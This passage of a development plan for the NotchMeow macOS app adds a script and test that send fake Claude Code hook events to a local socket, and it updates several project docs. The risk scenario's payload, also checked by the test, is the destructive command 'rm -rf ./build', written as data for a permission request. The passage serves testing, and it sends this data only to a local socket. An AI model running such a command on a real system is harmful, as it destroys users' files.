**The owner's script.** `scripts/fake-sidekick-events.py` sends the hook events of a made-up Claude Code session (the project `notchmeow-fake-sidekick`, every payload marked `NM-FAKE`) through the app's socket the way the relay does, so a running **Debug** build shows the sidekick at work: `loop` (the same step four times: a "going in circles" note), `risk` (a high-risk request held open until you answer the card: the grey line, the badge, the cat's jump), `waiting` (a request held open: leave its card within a minute and a note says it is still waiting), `away` (**lock your Mac** when it says so: it keeps an agent busy for a few minutes, and the recap shows when you unlock), `quiet` (a step that begins and never ends, or with `--finish` one that ends: the quiet nudge comes after 15 or 5 minutes) and `end`. It never runs `claude`. Its test sends it to a socket of the test's own (`tests/kitten_socket_server.py`), never the app's, and checks each scenario's events in order, that `--print` sends nothing, that an unreachable socket is exit code 1 and a speed or a number of minutes of 0 or less is exit code 2.

- [ ] **Step 1: Write the script and its test**

**Create `scripts/fake-sidekick-events.py`**

```python
#!/usr/bin/env python3
"""Sends the hook events of a made-up Claude Code session through NotchMeow's socket, the way the nm-hook relay does, so a running Debug build shows the sidekick at work.

  python3 scripts/fake-sidekick-events.py                      the loop: a session, then the same step four times: a "going in circles" nudge
  python3 scripts/fake-sidekick-events.py --scenario risk      a high-risk permission request (rm -rf ./build), held open until you answer the card: the grey line, the High risk badge
  python3 scripts/fake-sidekick-events.py --scenario waiting   a permission request, held open: open another view of the island within a minute (the chat, say), and the nudge says it is still waiting
  python3 scripts/fake-sidekick-events.py --scenario away      LOCK YOUR MAC when it says so; the script keeps an agent busy for a few minutes; unlock when it says: the recap
  python3 scripts/fake-sidekick-events.py --scenario quiet     a session that starts a step and then says nothing: the nudge comes after 15 minutes (5 after a finished step; use --finish for that)
  python3 scripts/fake-sidekick-events.py --scenario all       risk, then the loop (the quick ones)
  python3 scripts/fake-sidekick-events.py --scenario end       end the fake session
  python3 scripts/fake-sidekick-events.py --print              print the payloads instead of sending them
  python3 scripts/fake-sidekick-events.py --sock /path/nm.sock another socket (the App Store build's is ~/Library/Containers/<id>/Data/nm.sock)

This is for the owner's check on a real Debug build, and it never runs `claude`: the tests send it to a socket of their own (scripts/test-fake-sidekick-events.sh) and never to the app. Each event is one
connection, newline-delimited JSON, as the relay sends it. Every payload carries the project name `notchmeow-fake-sidekick` and the marker NM-FAKE, so what it shows is easy to tell from real work.
"""
import argparse, json, os, socket, sys, time

DEFAULT_SOCK = os.path.expanduser("~/Library/Application Support/NotchMeow/nm.sock")
COMMON = {"session_id": "fake-sidekick-1", "cwd": "/tmp/notchmeow-fake-sidekick", "term_program": "Apple_Terminal", "bundle_id": "com.apple.Terminal"}


def ev(say, name, **extra):
    return (say, {**COMMON, "hook_event_name": name, **extra})


def bash(command, name="PostToolUse"):
    return {"hook_event_name": name, "tool_name": "Bash", "tool_input": {"command": command}}


def start():
    return [ev("the session starts: the Claude Code pill appears", "SessionStart", source="startup"),
            ev("a prompt: the cat thinks", "UserPromptSubmit", prompt="NM-FAKE: do the thing")]


def scenario(name, minutes, finish):
    steps = start()
    if name == "loop":
        for i in range(4):
            steps.append(("the same step, time %d of 4%s" % (i + 1, ": the nudge shows now" if i == 3 else ""), {**COMMON, **bash("echo NM-FAKE loop")}))
    elif name == "risk":
        steps.append(("a high-risk request: the card has a grey line and a High risk badge, the cat jumps; it is held open until you answer",
                      {**COMMON, **bash("rm -rf ./build", "PermissionRequest")}))
    elif name == "waiting":
        steps.append(("a request: leave its card, open the chat, and wait a minute; the island says Claude Code is still waiting for your OK",
                      {**COMMON, **bash("git push origin main", "PermissionRequest")}))
    elif name == "away":
        for i in range(int(minutes * 3)):
            steps.append(("work while you are away (%d of %d)" % (i + 1, int(minutes * 3)), {**COMMON, "hook_event_name": "PostToolUse", "tool_name": "Edit",
                          "tool_input": {"file_path": "/tmp/notchmeow-fake-sidekick/file%d.txt" % (i % 3), "old_string": "a", "new_string": "b"}}))
        steps.append(("the turn ends: unlock your Mac now; the recap shows once", {**COMMON, "hook_event_name": "Stop", "last_assistant_message": "NM-FAKE done."}))
    elif name == "end":
        steps = [ev("the fake session ends", "SessionEnd")]
    elif name == "quiet":
        steps.append(("a step begins and never ends: the nudge comes 15 minutes later", {**COMMON, **bash("sleep 3600", "PreToolUse")}))
        if finish:
            steps[-1] = ("a step ends and nothing follows: the nudge comes 5 minutes later", {**COMMON, **bash("echo NM-FAKE")})
    return steps


def send(sock_path, payload, permission_timeout):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(permission_timeout if payload.get("hook_event_name") == "PermissionRequest" else 5)
    try:
        s.connect(sock_path)
        s.sendall((json.dumps(payload) + "\n").encode())
        reply = b""
        while not reply.endswith(b"\n"):
            chunk = s.recv(4096)
            if not chunk:
                break
            reply += chunk
        return reply.decode().strip()
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--scenario", default="loop", choices=["loop", "risk", "waiting", "away", "quiet", "all", "end"])
    ap.add_argument("--minutes", type=float, default=3.0, help="how long the away scenario keeps an agent busy (the recap needs more than 2)")
    ap.add_argument("--finish", action="store_true", help="the quiet scenario: end a step instead of starting one")
    ap.add_argument("--sock", default=DEFAULT_SOCK)
    ap.add_argument("--print", dest="dry", action="store_true", help="print the payloads, send nothing")
    ap.add_argument("--speed", type=float, default=1.0, help="2 waits half as long between events")
    ap.add_argument("--permission-timeout", type=float, default=120.0)
    a = ap.parse_args()
    if a.speed <= 0:
        ap.error("--speed must be more than 0 (2 waits half as long, 0.5 twice as long)")
    if a.minutes <= 0:
        ap.error("--minutes must be more than 0")
    names = ["risk", "loop"] if a.scenario == "all" else [a.scenario]
    gap = 20.0 if a.scenario == "away" else 2.0
    for name in names:
        for say, payload in scenario(name, a.minutes, a.finish):
            print("-", say, flush=True)
            if a.dry:
                print("  " + json.dumps(payload, sort_keys=True))
                continue
            try:
                reply = send(a.sock, payload, a.permission_timeout)
            except OSError as e:
                print(f"  could not reach {a.sock}: {e}", file=sys.stderr)
                return 1
            print("  ->", reply or "(closed)", flush=True)
            time.sleep(gap / a.speed)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

**Create `scripts/test-fake-sidekick-events.sh`**

```bash
#!/usr/bin/env bash
# The owner's fake sidekick session (scripts/fake-sidekick-events.py) is sent to a socket of this test's own, never the app's, and what that socket received is checked: the events of each scenario in
# order, the high-risk request only in the risk scenario, no payload with a prompt or a command that is not the marked fake. Nothing here launches or touches NotchMeow.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-fake-sidekick.XXXXXX")"
SOCK_DIR="$(mktemp -d "${TMPDIR:-/tmp}/nmt.XXXXXX")"
[ "${#SOCK_DIR}" -le 80 ] || { rm -rf "$SOCK_DIR"; SOCK_DIR="$(mktemp -d /tmp/nmt.XXXXXX)"; }   # a socket path holds 103 bytes
SERVER=""
trap '[ -z "$SERVER" ] || { kill "$SERVER" 2>/dev/null; wait "$SERVER" 2>/dev/null; } || true; rm -rf "$TEST_DIR" "$SOCK_DIR"' EXIT

python3 tests/kitten_socket_server.py "$SOCK_DIR/s" "$SOCK_DIR/received.jsonl" &
SERVER=$!
for _ in $(seq 1 50); do [ -S "$SOCK_DIR/s" ] && break; sleep 0.1; done
[ -S "$SOCK_DIR/s" ] || { echo "the test socket did not come up"; exit 1; }

fail=0
check() { if [ "$2" = "$3" ]; then echo "  ✓ $1"; else echo "  ✗ $1"; echo "    got:      $2"; echo "    expected: $3"; fail=1; fi; }
names() { python3 -I -c 'import json,sys; print(" ".join(json.loads(l)["hook_event_name"] for l in open(sys.argv[1])))' "$1"; }
cmds() { python3 -I -c 'import json,sys; print("|".join(json.loads(l).get("tool_input",{}).get("command","") for l in open(sys.argv[1]) if "command" in json.loads(l).get("tool_input",{})))' "$1"; }

echo "the loop (the default)"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 > /dev/null
check "the events, in order" "$(names "$SOCK_DIR/received.jsonl")" "SessionStart UserPromptSubmit PostToolUse PostToolUse PostToolUse PostToolUse"
check "the same step four times" "$(cmds "$SOCK_DIR/received.jsonl")" "echo NM-FAKE loop|echo NM-FAKE loop|echo NM-FAKE loop|echo NM-FAKE loop"

echo "the risk scenario"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 --scenario risk > /dev/null
check "a permission request, the high-risk one" "$(names "$SOCK_DIR/received.jsonl")|$(cmds "$SOCK_DIR/received.jsonl")" "SessionStart UserPromptSubmit PermissionRequest|rm -rf ./build"

echo "the waiting scenario"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 --scenario waiting > /dev/null
check "a permission request with nothing after it" "$(names "$SOCK_DIR/received.jsonl")" "SessionStart UserPromptSubmit PermissionRequest"

echo "the away scenario: a minute of work, three events a minute, and the stop"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 --scenario away --minutes 1 > /dev/null
check "three edits and a stop after the start" "$(names "$SOCK_DIR/received.jsonl")" "SessionStart UserPromptSubmit PostToolUse PostToolUse PostToolUse Stop"

echo "the quiet scenario"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 --scenario quiet > /dev/null
check "a step that begins and never ends" "$(names "$SOCK_DIR/received.jsonl")" "SessionStart UserPromptSubmit PreToolUse"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 --scenario quiet --finish > /dev/null
check "or one that ends and nothing follows" "$(names "$SOCK_DIR/received.jsonl")" "SessionStart UserPromptSubmit PostToolUse"

echo "the end scenario"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 --scenario end > /dev/null
check "only the end of the session" "$(names "$SOCK_DIR/received.jsonl")" "SessionEnd"

echo "all: the risk scenario, then the loop"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/s" --speed 100000 --scenario all > /dev/null
check "nine events: the risk scenario's three and the loop's six" "$(names "$SOCK_DIR/received.jsonl" | wc -w | tr -d ' ')" "9"

echo "--print sends nothing"
: > "$SOCK_DIR/received.jsonl"
python3 scripts/fake-sidekick-events.py --print --sock "$SOCK_DIR/s" > /dev/null
check "no connection was made" "$(wc -l < "$SOCK_DIR/received.jsonl" | tr -d ' ')" "0"

echo "an unreachable socket is an error, not a hang"
set +e
python3 scripts/fake-sidekick-events.py --sock "$SOCK_DIR/nothing" --speed 100000 > /dev/null 2>&1
check "exit code 1" "$?" "1"
echo "a speed of 0 or less, and minutes of 0 or less, are refused"
python3 scripts/fake-sidekick-events.py --print --speed 0 > /dev/null 2>&1
check "speed 0: exit code 2" "$?" "2"
python3 scripts/fake-sidekick-events.py --print --scenario away --minutes 0 > /dev/null 2>&1
check "minutes 0: exit code 2" "$?" "2"
set -e

[ "$fail" = 0 ] && echo && echo "All tests passed." || { echo; echo "tests failed."; exit 1; }
```

Then make it executable: `chmod +x scripts/test-fake-sidekick-events.sh`

- [ ] **Step 2: Run the test**

Run: `bash scripts/test-fake-sidekick-events.sh`
Expected: PASS: ten headings (`the loop (the default)`, `the risk scenario`, `the waiting scenario`, `the away scenario…`, `the quiet scenario`, `the end scenario`, `all: …`, `--print sends nothing`, `an unreachable socket…`, `a speed of 0 or less…`), 13 `✓` lines, then `All tests passed.`

- [ ] **Step 2b: Look at what the script sends**

Run: `python3 scripts/fake-sidekick-events.py --scenario risk --print`
Expected: three `- …` lines, each followed by a JSON payload, the third a `PermissionRequest` whose `tool_input` is `{"command": "rm -rf ./build"}`. Nothing is sent.

- [ ] **Step 3: The docs**

`CLAUDE.md` gets one bullet (the Mac's sidekick: its files, its tests, its rules), `ARCHITECT.md` says in item 6 that the Mac is built, the roadmap gains the F1 row, the French spec gets "Le compagnon" under §8, `INTEGRATIONS.md` says what the sidekick reads and what it never keeps, and `QA-MAC.md` gets Step 15 (the card's line and badge, the loop note) with its report row.

**Edit `CLAUDE.md`** (the find text occurs exactly once)

Find:

```markdown
- `NotchBuddy/Sources/App/IslandWing.swift` — the compact island's right wing steps aside (Mac only): with the pointer over the grid of agent cats the grid and the ear's black fade out in 0.15 s, the panel passes the mouse on to the menu-bar icons under it, and the grid comes back 1 s after the pointer leaves; the pointer over the wing no longer opens the island. Pure Foundation rules, fed by `IslandWindowController.pollFrame` (the existing poll: no timer or monitor of its own) and tested by `scripts/test-island-wing.sh`; `scripts/test-island-wing-wiring.sh` pins the app-side call sites; `render-cats.sh --wing` draws the faded state (`docs/SPEC.md`, "L'aile droite s'efface").
- `shared/sidekick-core.js` — the agent sidekick's rules (sub-project F1): the risk label under a permission request (`explain`), the session ledger (`eventFrom`, `ledgerApply`), the stuck nudges (`stuckStep`), the recap and the status answer (`recapOf`, `statusOf`, `matchStatusQuestion`), dismissals and the Sidekick settings (`dismiss`, `muted`, `unmute`, `cleanSidekickSettings`), away detection (`presenceStep`), the show gate (`shouldShow`) and the local voice's sanity check (`acceptNicerLine`). Pure, shared by Node and the apps' tests. `node scripts/gen-sidekick-fixtures.mjs` writes `tests/fixtures/sidekick/` from it (`--check` fails on drift), `bash scripts/test-sidekick-contract.sh` runs the lot, `node scripts/print-sidekick-tables.mjs` prints the rules as tables, and `docs/SIDEKICK-CONTRACT.md` documents them. If an app and a fixture disagree, `sidekick-core.js` decides. The sidekick labels and remembers: it never allows or denies, and keeps no prompt, no assistant text, no command and no full path.
- `NotchBuddy/Sources/App/HookOrigin.swift` — which pill a hook event belongs to (Mac): Claude Code from VS Code **and from any terminal** reaches the Claude Code pill (`integration_claude`, labelled "VS Code"), Cursor, Codex and tagged agents keep theirs, and the "Handled in …" notes and the pill's tap name the app the session runs in. Pure Foundation, tested by `scripts/test-hook-origin.sh`; `scripts/test-hook-origin-wiring.sh` pins the call sites in `HookServer`; `scripts/fake-terminal-events.py` sends a scripted terminal session to a running Debug build and is only for the owner's check.
- `docs/SPEC.md`, `docs/INTEGRATIONS.md` — behaviour, views, states, integrations (in French).
```

Replace with:

```markdown
- `NotchBuddy/Sources/App/IslandWing.swift` — the compact island's right wing steps aside (Mac only): with the pointer over the grid of agent cats the grid and the ear's black fade out in 0.15 s, the panel passes the mouse on to the menu-bar icons under it, and the grid comes back 1 s after the pointer leaves; the pointer over the wing no longer opens the island. Pure Foundation rules, fed by `IslandWindowController.pollFrame` (the existing poll: no timer or monitor of its own) and tested by `scripts/test-island-wing.sh`; `scripts/test-island-wing-wiring.sh` pins the app-side call sites; `render-cats.sh --wing` draws the faded state (`docs/SPEC.md`, "L'aile droite s'efface").
- `shared/sidekick-core.js` — the agent sidekick's rules (sub-project F1): the risk label under a permission request (`explain`), the session ledger (`eventFrom`, `ledgerApply`), the stuck nudges (`stuckStep`), the recap and the status answer (`recapOf`, `statusOf`, `matchStatusQuestion`), dismissals and the Sidekick settings (`dismiss`, `muted`, `unmute`, `cleanSidekickSettings`), away detection (`presenceStep`), the show gate (`shouldShow`) and the local voice's sanity check (`acceptNicerLine`). Pure, shared by Node and the apps' tests. `node scripts/gen-sidekick-fixtures.mjs` writes `tests/fixtures/sidekick/` from it (`--check` fails on drift), `bash scripts/test-sidekick-contract.sh` runs the lot, `node scripts/print-sidekick-tables.mjs` prints the rules as tables, and `docs/SIDEKICK-CONTRACT.md` documents them. If an app and a fixture disagree, `sidekick-core.js` decides. The sidekick labels and remembers: it never allows or denies, and keeps no prompt, no assistant text, no command and no full path.
- Sub-project F1 on the Mac (the sidekick): the pure ports of the contract are `SidekickText.swift` (the regular-expression kit, the basename, the command key), `SidekickExplain.swift`, `SidekickLedger.swift`, `SidekickStuck.swift`, `SidekickRecap.swift`, `SidekickSettings.swift` (and `SidekickStore.swift`, the keys `sidekick.on`, `sidekick.local`, `sidekick.dismissals`), `SidekickPresence.swift` (presence, the Mac's notifications as flags, the idle sample's rule, the show gate), `SidekickNotes.swift` (held and shown notes, `SidekickHost`, and `SidekickClock`, the sidekick's ONE one-shot timer), `SidekickVoice.swift` and `SidekickVoiceLocal.swift` (a nicer sentence only from a model on this computer, never by Auto) and `SidekickDrop.swift`; each replays `tests/fixtures/sidekick/` through `scripts/test-sidekick-*.sh`. `SidekickEngine.swift` is the brain with everything it needs handed in as closures (`tests/SidekickEngineTests.swift` drives it with a clock and a timer by hand), `Sidekick.swift` is the app's side (the wall clock, the timer, the feed that `HookServer` calls at the top of each handler before the pending-approval gate), `PresenceMonitor.swift` observes lock, sleep and the displays once for the desktop cat and the sidekick, `SidekickView.swift` is the island's `.sidekick` row (a note opens the island the way a finished task does; never a window of its own), `AgentTarget.swift` holds the pill's routes to an agent's app (shared by the ↗ button, a note's Show me and a drop on an agent's cat), `SidekickChat.swift` answers "What's Claude doing?" on this Mac and never in a conversation, `SidekickDropApp.swift` copies a dropped file's path for an agent's own cat (the big cat's drop is unchanged), and Settings → Sidekick is `SidekickSettingsView.swift`. The permission card gains one grey line and a High risk badge (`ApprovalInfo.target`, `.risk`, `.line`) and nothing else. `scripts/test-sidekick-leak.sh` proves a marker planted in a command, a prompt, a parent folder, an assistant message and a file never reaches a log or a non-local provider; `scripts/test-sidekick-wiring.sh` pins the call sites and that it starts no timer of its own; `bash scripts/render-sidekick.sh` draws the notes and Settings → Sidekick without the app; `scripts/fake-sidekick-events.py` sends scripted sessions to a running Debug build and is only for the owner's check. It is in Debug, Release and App Store builds (`check-app-binary.sh` looks for `NM_SIDEKICK_ENGINE_PRESENT`).
- `NotchBuddy/Sources/App/HookOrigin.swift` — which pill a hook event belongs to (Mac): Claude Code from VS Code **and from any terminal** reaches the Claude Code pill (`integration_claude`, labelled "VS Code"), Cursor, Codex and tagged agents keep theirs, and the "Handled in …" notes and the pill's tap name the app the session runs in. Pure Foundation, tested by `scripts/test-hook-origin.sh`; `scripts/test-hook-origin-wiring.sh` pins the call sites in `HookServer`; `scripts/fake-terminal-events.py` sends a scripted terminal session to a running Debug build and is only for the owner's check.
- `docs/SPEC.md`, `docs/INTEGRATIONS.md` — behaviour, views, states, integrations (in French).
```

**Edit `ARCHITECT.md`** (the find text occurs exactly once)

Find:

```markdown
   - **Sub-project H on Windows/Linux:** the `cat` block's `desktop` object (`on`, `size`, `spots`) is cleaned with the rest of the block by `cat/display.ts` and `clean_cat_block`. The island's page is the brain: `island/desktop.ts` runs the trip (`cat/desktoptrip.ts`, from `desktopStep`), takes the cat out of the notch (a press on it that moves 4 px, `cat/pressdrag.ts`), asks `State.attentionNeeded` for alerts and keeps the notch's big-cat spot empty (`State.desktopNotchEmpty`) while the cat is out. A second window, `desktop.html`, is the body: `desktop/body.ts` draws the cat, flies it (`cat/desktopflight.ts`), takes the clicks and the drag (`cat/gestures.ts`), and keeps to the frame rate the contract gives (`cat/desktopgov.ts`). Rust (`src-tauri/src/desktop.rs`) only moves and shows the window, decides what takes the mouse and relays the messages between the two pages.
   - **Sub-project I (the wardrobe):** its contract is in `design/prototype/cat-core.js` and `tests/fixtures/cat/wardrobe-cases.json` (new names only; the prototype's Wardrobe panel draws it, and `shared/theme.json` has the `outfits` colours): `OUTFIT_IDS` and `cleanWardrobeSettings`, Auto's calendar (`easterOf`, `autoOutfitFor`, `resolveOutfit`), who wears it (`outfitWorn(role)`: the big-cat role at every size, the compact notch included), where it sits (`outfitAnchors`, `outfitRoom`, the slots `OUTFIT_SLOTS` and `OUTFIT_ORDER`) and its shapes (`outfitGeometry`, checked by `outfitDigest`); see `docs/CAT-CONTRACT.md`, "The wardrobe (I-0)". The two app plans (I-mac, I-tauri) build on it.
6. **Sidekick (sub-project F1).** The cats say something useful at task boundaries: a recap on return, a plain line and a risk label under a permission request, a nudge when an agent looks stuck, and "What's Claude doing?" in the chat. The brain is pure rules in `shared/sidekick-core.js` (no AI, always on; a local model may only polish a sentence), fed by a ledger of the hook events each app already receives and tested against `tests/fixtures/sidekick/` (`docs/SIDEKICK-CONTRACT.md`). It labels and remembers, never decides: only the user's click answers a request.

## Code map (graphify)
```

Replace with:

```markdown
   - **Sub-project H on Windows/Linux:** the `cat` block's `desktop` object (`on`, `size`, `spots`) is cleaned with the rest of the block by `cat/display.ts` and `clean_cat_block`. The island's page is the brain: `island/desktop.ts` runs the trip (`cat/desktoptrip.ts`, from `desktopStep`), takes the cat out of the notch (a press on it that moves 4 px, `cat/pressdrag.ts`), asks `State.attentionNeeded` for alerts and keeps the notch's big-cat spot empty (`State.desktopNotchEmpty`) while the cat is out. A second window, `desktop.html`, is the body: `desktop/body.ts` draws the cat, flies it (`cat/desktopflight.ts`), takes the clicks and the drag (`cat/gestures.ts`), and keeps to the frame rate the contract gives (`cat/desktopgov.ts`). Rust (`src-tauri/src/desktop.rs`) only moves and shows the window, decides what takes the mouse and relays the messages between the two pages.
   - **Sub-project I (the wardrobe):** its contract is in `design/prototype/cat-core.js` and `tests/fixtures/cat/wardrobe-cases.json` (new names only; the prototype's Wardrobe panel draws it, and `shared/theme.json` has the `outfits` colours): `OUTFIT_IDS` and `cleanWardrobeSettings`, Auto's calendar (`easterOf`, `autoOutfitFor`, `resolveOutfit`), who wears it (`outfitWorn(role)`: the big-cat role at every size, the compact notch included), where it sits (`outfitAnchors`, `outfitRoom`, the slots `OUTFIT_SLOTS` and `OUTFIT_ORDER`) and its shapes (`outfitGeometry`, checked by `outfitDigest`); see `docs/CAT-CONTRACT.md`, "The wardrobe (I-0)". The two app plans (I-mac, I-tauri) build on it.
6. **Sidekick (sub-project F1).** The cats say something useful at task boundaries: a recap on return, a plain line and a risk label under a permission request, a nudge when an agent looks stuck, and "What's Claude doing?" in the chat. The brain is pure rules in `shared/sidekick-core.js` (no AI, always on; a local model may only polish a sentence), fed by a ledger of the hook events each app already receives and tested against `tests/fixtures/sidekick/` (`docs/SIDEKICK-CONTRACT.md`). It labels and remembers, never decides: only the user's click answers a request. **On the Mac** it is built: the pure rules are Swift ports replayed against the fixtures; `SidekickEngine` holds the whole flow with the app's clock, timer and island handed in; `HookServer` feeds the ledger at the top of each handler, before the pending-approval gate; the permission card gets one grey line and a High risk badge; a note is a `.sidekick` row that opens the island like a finished task; "What's Claude doing?" is answered on this Mac and never added to a conversation; a drop on an agent's own cat copies the file's path and brings that agent forward; and the one `PresenceMonitor` serves the desktop cat and the sidekick.

## Code map (graphify)
```

**Edit `README.md`** (the find text occurs exactly once)

Find:

```markdown
| D | Signed releases and the website | stage 1 (tester builds and the site) in progress; signing is stage 2 |
| H | A desktop cat: drag the big cat out of the notch and keep it on the desktop | built on macOS, Windows and Linux; real-build checks pending |
| G1 | A file shelf in the notch: park files, drag them out later, send them to a phone | built on macOS (Windows and Linux follow); real-build checks pending |

The full design lives in [`docs/superpowers/specs/`](docs/superpowers/specs/).
```

Replace with:

```markdown
| D | Signed releases and the website | stage 1 (tester builds and the site) in progress; signing is stage 2 |
| H | A desktop cat: drag the big cat out of the notch and keep it on the desktop | built on macOS, Windows and Linux; real-build checks pending |
| G1 | A file shelf in the notch: park files, drag them out later, send them to a phone | built on macOS (Windows and Linux follow); real-build checks pending |
| F1 | The agent sidekick: a recap when you come back, a plain line and a risk badge on permission requests, a nudge when an agent looks stuck, "What's Claude doing?", and a file dropped on an agent's own cat | built on macOS; Windows and Linux planned; real-build checks pending |

The full design lives in [`docs/superpowers/specs/`](docs/superpowers/specs/).
```

**Edit `docs/SPEC.md`** (the find text occurs exactly once)

Find:

```markdown
## 9. Sons
```

Replace with:

```markdown
### Le compagnon (sous-projet F1)

Les chats disent quelque chose d'utile, seulement aux frontières d'une tâche, seulement dans l'île, jamais par-dessus le travail (contrat : `docs/SIDEKICK-CONTRACT.md` ; Mac : `docs/superpowers/plans/2026-10-14-f1-mac-sidekick.md`). Aucune IA ne décide : des règles simples, toujours actives ; un modèle **local** peut seulement reformuler une phrase.

- **La carte de permission** reste telle quelle, avec **une ligne grise** sous la commande (une phrase fixe avec un nom de fichier, jamais la commande) et, pour un risque élevé, une petite pastille orange « High risk » et l'émote Surpris du chat. Deny, Allow et Always, la limite de 120 s et « jamais d'approbation sans clic » ne changent pas.
- **Un récapitulatif** au retour (écran verrouillé, veille, écran éteint ou 5 minutes sans rien toucher, pendant au moins 2 minutes) si un agent a fait quelque chose, **un rappel** quand un agent semble bloqué (même étape 4 fois, 3 erreurs de suite, une demande qui attend depuis 60 s dont la carte n'est pas à l'écran, ou 5 minutes de silence), une fois par session. Une note est une rangée `.sidekick` de l'île : elle l'ouvre comme une tâche terminée, attend si la carte d'une demande ou le chat est devant ou si l'utilisateur écrit (30 s pour un rappel, 2 minutes pour un récapitulatif, puis elle disparaît sans bruit), et s'en va seule. OK, × et Not now comptent comme un refus ; deux refus coupent ce type de note jusqu'à Réglages → Sidekick → Unmute ; replier l'île sans l'avoir vue ne compte pas.
- **« What's Claude doing? »** dans le chat reçoit une réponse **sur ce Mac**, tirée du registre des sessions, jamais ajoutée à une conversation : aucun fournisseur, donc aucun modèle cloud, ne la voit.
- **Déposer un fichier sur le chat d'un agent** (un chat de la grille en mode A cat for each agent, le chat 2 en mode Two cats ; jamais le gros chat, dont le dépôt ne change pas) copie le **chemin d'origine** dans le presse-papiers, amène l'app de cet agent devant et affiche « Copied the path — paste it into … ». Rien n'est collé ni envoyé à une autre app.
- **Vie privée** : le registre est en mémoire seulement, sans prompt, sans texte de l'assistant, sans `transcript_path`, sans commande ni chemin complet (des noms de fichier seulement) ; jamais écrit sur disque ni dans un journal. `scripts/test-sidekick-leak.sh` le prouve avec un mot repère.
- **Stockage** : `sidekick.on`, `sidekick.local` (Bool) et `sidekick.dismissals` (JSON), nettoyés par `SidekickSettings.clean`.

## 9. Sons
```

**Edit `docs/INTEGRATIONS.md`** (the find text occurs exactly once)

Find:

```markdown
- **Si l'app ne répond pas en 300 ms, `nm-hook` sort en code 0 sans rien écrire** : Claude Code continue normalement. Jamais de blocage.
- **Quelles sessions apparaissent (Mac).** Toutes les sessions Claude Code arrivent, depuis VS Code comme depuis n'importe quel terminal (Terminal, iTerm, Ghostty, Warp, kitty…), comme sur Windows et Linux ; avant, seules celles de VS Code et de Cursor étaient affichées. Elles partagent la pastille Claude Code (`integration_claude`, libellée « VS Code »). Cursor et Codex gardent leur pastille (`agent_cursor`, `agent_codex`) et un agent étiqueté `nm_agent` la sienne. Deux sessions à la fois (VS Code et un terminal) partagent donc la même pastille : l'île montre la dernière. Les notes « Handled in … » et « Still waiting in … » nomment l'app où se trouve la session (VS Code, Terminal, iTerm…), et un tap sur la pastille amène cette app devant (version GitHub). La règle est `HookOrigin.swift`, testée par `scripts/test-hook-origin.sh` et `scripts/test-hook-origin-wiring.sh`.
- Champ optionnel `nm_agent` : nom en minuscules, chiffres et tirets, 24 caractères au plus. Si absent ou invalide, l'événement va dans la pastille Claude. Voir `docs/AGENTS.md` pour les autres agents.

```

Replace with:

```markdown
- **Si l'app ne répond pas en 300 ms, `nm-hook` sort en code 0 sans rien écrire** : Claude Code continue normalement. Jamais de blocage.
- **Quelles sessions apparaissent (Mac).** Toutes les sessions Claude Code arrivent, depuis VS Code comme depuis n'importe quel terminal (Terminal, iTerm, Ghostty, Warp, kitty…), comme sur Windows et Linux ; avant, seules celles de VS Code et de Cursor étaient affichées. Elles partagent la pastille Claude Code (`integration_claude`, libellée « VS Code »). Cursor et Codex gardent leur pastille (`agent_cursor`, `agent_codex`) et un agent étiqueté `nm_agent` la sienne. Deux sessions à la fois (VS Code et un terminal) partagent donc la même pastille : l'île montre la dernière. Les notes « Handled in … » et « Still waiting in … » nomment l'app où se trouve la session (VS Code, Terminal, iTerm…), et un tap sur la pastille amène cette app devant (version GitHub). La règle est `HookOrigin.swift`, testée par `scripts/test-hook-origin.sh` et `scripts/test-hook-origin-wiring.sh`.
- **Ce que lit le compagnon (Mac, F1).** Les mêmes événements, rien de plus : `session_id` ou `conversation_id`, `cwd` (le nom du dossier seulement), `hook_event_name`, `tool_name`, `tool_input`, `nm_agent`, `term_program` et `bundle_id`. Il ne lit jamais `transcript_path` ni le texte d'un prompt ou de l'assistant, ne garde ni commande ni chemin complet (un nom de fichier, une empreinte de la commande et des compteurs), n'écrit rien sur disque ni dans un journal, et n'installe aucun hook. Il lit chaque événement **avant** la règle de la demande en attente (`HookServer`), pour compter aussi une demande remplacée ou refusée ; il ne répond jamais à une demande.
- Champ optionnel `nm_agent` : nom en minuscules, chiffres et tirets, 24 caractères au plus. Si absent ou invalide, l'événement va dans la pastille Claude. Voir `docs/AGENTS.md` pour les autres agents.

```

**Edit `docs/QA-MAC.md`** (the find text occurs exactly once)

Find:

```markdown
You started that process, and only that one is yours to quit. Leave the tester build installed in `/Applications` for the owner's check. Check that Settings are back as you found them (Display mode, Main cat, and the Desktop switch off). List what you left behind: the installed app, and `/tmp/notchmeow-qa-VERSION/` with your files.

## Screenshots

```

Replace with:

````markdown
You started that process, and only that one is yours to quit. Leave the tester build installed in `/Applications` for the owner's check. Check that Settings are back as you found them (Display mode, Main cat, and the Desktop switch off). List what you left behind: the installed app, and `/tmp/notchmeow-qa-VERSION/` with your files.

## Step 15: the sidekick

The sidekick says something useful at task boundaries: a grey line and a High risk badge on a permission card, and a nudge when an agent looks stuck. The lock and the recap, "What's Claude doing?" in the chat and the drop on an agent's own cat need a person at the keyboard (the owner's list in the plan, Task 22), so this step covers what the relay can send. It uses the owner's script, which never runs `claude`:

```bash
python3 scripts/fake-sidekick-events.py --scenario risk --permission-timeout 60 > "$QA/sidekick-risk.out" 2>&1 &
```

